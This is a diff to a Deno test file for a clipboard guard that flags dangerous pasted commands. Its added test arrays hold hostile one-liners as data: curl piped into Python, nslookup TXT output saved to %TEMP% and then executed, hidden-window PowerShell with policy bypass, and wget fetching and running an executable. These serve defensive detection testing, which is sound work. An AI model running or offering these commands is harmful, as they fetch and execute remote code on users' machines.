@@ -158,11 +158,59 @@ Deno.test("clipboard guard patterns: nslookup run as commands, pipe to python/pe
   assert(fp.length === 0, "false positive: " + JSON.stringify(fp));
 });
 
+// Review 2026-11-27 (false positives of the new patterns). "-w 1" counts
+// only as a switch of powershell itself, not inside the -c payload. A pipe
+// into "python3 -" also matches with arguments after the "-". nslookup into
+// %TEMP% matches only when that file then runs.
+const MISSED_2026_11_27_C = [
+  "powershell -NoP -Exec Bypass -w 1 -c \"Start-Process calc\"",
+  "\"powershell.exe\" -nop -WindowStyle 1 -c \"Start-Process calc\"",
+  "pwsh -ep bypass /w 1 -c \"Start-Process calc\"",
+  "curl -sSL http://203.0.113.5/a | python3 - --version 1.8.0",
+  "curl http://203.0.113.5/a | sudo python -",
+  "nslookup -q=txt verify.example 203.0.113.5 > %TEMP%\\a.cmd & call %TEMP%\\a.cmd",
+  "nslookup -q=txt verify.example 203.0.113.5 > $env:TEMP\\a.ps1; & $env:TEMP\\a.ps1",
+  "nslookup -q=txt verify.example 203.0.113.5 > %TEMP%\\a.cmd && cmd /c %TEMP%\\a.cmd",
+  "nslookup -q=txt verify.example 203.0.113.5 > %TEMP%\\a.cmd && start \"\" %TEMP%\\a.cmd",
+  "nslookup -q=txt verify.example 203.0.113.5 > $env:TEMP\\a.ps1; powershell -ep bypass -f $env:TEMP\\a.ps1",
+  "nslookup -q=txt verify.example 203.0.113.5 > %TEMP%\\a.vbs & wscript %TEMP%\\a.vbs",
+  "powershell -ver 2 -w 1 -c \"Start-Process calc\"",
+  "powershell -o text -w 1 -c \"Start-Process calc\"",
+  "pwsh -config x -w 1 -c \"Start-Process calc\"",
+  "powershell -noprofile -noninteractive -sta -mta -nologo -nop -nop -nop -nop -w 1 -c \"Start-Process calc\"",
+  "wget -O %TEMP%\\a.exe https://203.0.113.5/a.exe -o log.txt && %TEMP%\\a.exe",
+];
+const BENIGN_2026_11_27_C = [
+  "powershell -c \"ping -n 1 -w 1 192.0.2.1\"",
+  "powershell ping -n 1 -w 1 192.0.2.1",
+  "powershell -nop ping -n 1 -w 1 192.0.2.1",
+  "powershell -File .\\x.ps1 -w 1",
+  "powershell -Command \"Test-Connection 192.0.2.1 -Count 1; ping -w 1 192.0.2.1\"",
+  "nslookup example.com > %TEMP%\\dns.txt",
+  "nslookup example.com > %TEMP%\\dns.txt && notepad %TEMP%\\dns.txt",
+  "curl https://example.test/data.json | python3 -m json.tool --sort-keys",
+];
+
+Deno.test("clipboard guard patterns: powershell's own -w 1, python3 - with arguments and a %TEMP% nslookup file that runs match; near misses do not", () => {
+  const g = loadClip();
+  const missed = MISSED_2026_11_27_C.filter((s) => !g.matchDangerous(s));
+  assert(missed.length === 0, "missed: " + JSON.stringify(missed));
+  const fp = BENIGN_2026_11_27_C.filter((s) => g.matchDangerous(s));
+  assert(fp.length === 0, "false positive: " + JSON.stringify(fp));
+  for (const s of [...MISSED_2026_11_27, ...MISSED_2026_11_27_B, ...DANGEROUS]) assert(g.matchDangerous(s), "missed: " + s);
+});
+
+Deno.test("clipboard guard: the Poetry and get-pip installer hosts are safe", () => {
+  const g = loadClip();
+  for (const h of ["python-poetry.org", "install.python-poetry.org", "pypa.io", "bootstrap.pypa.io", "pip.pypa.io"]) assert(g.onSafeHost(h), h);
+  for (const h of ["python-poetry.org.example.test", "evilpypa.io"]) assert(!g.onSafeHost(h), h);
+});
+
 Deno.test("clipboard guard patterns stay linear: 100 KB adversarial inputs are checked fast", () => {
   const g = loadClip();
   const size = 100 * 1024;
   const fill = (unit) => unit.repeat(Math.ceil(size / unit.length)).slice(0, size);
-  const inputs = ["curl|", "curl | ", "curl |/", "wget | sudo ", "bash <(", "sh -c $(", "finger |", "\\\\a", "\\\\a@", "msiexec /i ", "regsvr32 /i:", "powershell -f ", "pwsh ", "pwsh /", "pwsh \u2013", "cmd /q", "cmd/v:on ", "nslookup ", "nslookup >", "curl | python", "curl -o %temp% ", "curl -o %temp%&", "a", " ", "/"].map(fill);
+  const inputs = ["curl|", "curl | ", "curl |/", "wget | sudo ", "bash <(", "sh -c $(", "finger |", "\\\\a", "\\\\a@", "msiexec /i ", "regsvr32 /i:", "powershell -f ", "pwsh ", "pwsh /", "pwsh \u2013", "cmd /q", "cmd/v:on ", "nslookup ", "nslookup >", "curl | python", "curl -o %temp% ", "curl -o %temp%&", "iwr -o %tmp% ", "curl curl -o %temp% -o %temp% ", "nslookup > %temp% ", "nslookup > %temp% & ", "powershell -nop ", "pwsh -ep x -w ", "a", " ", "/"].map(fill);
   // A generous limit: the machine is shared. A quadratic pattern takes
   // seconds on these inputs.
   const LIMIT_MS = 500;
